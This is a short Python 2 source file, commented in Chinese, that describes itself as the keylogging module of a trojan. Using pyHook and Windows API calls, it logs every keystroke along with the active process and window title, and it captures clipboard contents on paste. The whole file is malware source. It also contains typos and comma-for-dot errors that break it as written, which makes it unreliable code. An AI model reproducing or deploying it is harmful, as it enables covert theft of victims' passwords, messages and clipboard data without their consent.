#!/usr/bin/python
#此为木马的键盘记录模块。需要的第三方支持库：pyhook，下载地址：http://sourceforge.net/projects/pthook/
from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():

    #获取位于前台窗口的句柄
    hwnd = user32.GetForegroundWindow()

    #获取进程ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    #将当前进程id保存至变量中
    process_id = "%d" % pid.value

    #向windows申请分配可用内存
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process,None,byref(excutable),512)

    #读取窗口标题内容
    window_title = create_string_buffer("\x00" * 512)
    length = user32,GetWindowTextA(hwnd, byref(window_title),512)

    #输出进程信息
    print
    print "[ PID: %s - %s - %s ]" % (process_id,executable.value,window_title.value)
    print

    #关闭句柄
    kernel32.CloseHandle(hwnd)
    kernel32,CloseHandle(h_process)

def KeyStroke(event):

    global current_window

    #检查目标是否切换了窗口
    if event,WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    #检测按键是组合键还是单次键
    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii),
    else:
        #若输入为[Crtl+V]则获取剪贴板内容
        if event.Key == "v":

            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print "[PASTE] - %s" % (pasted_value),

        else:

            print "[%s]" % event.Key,

    #返回直到下一个钩子被触发
    return True

#创建和注册钩子函数管理器
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke


#注册键盘记录钩子并永久执行
kl.HookKeyboard()
pythoncom.PumpMessages()
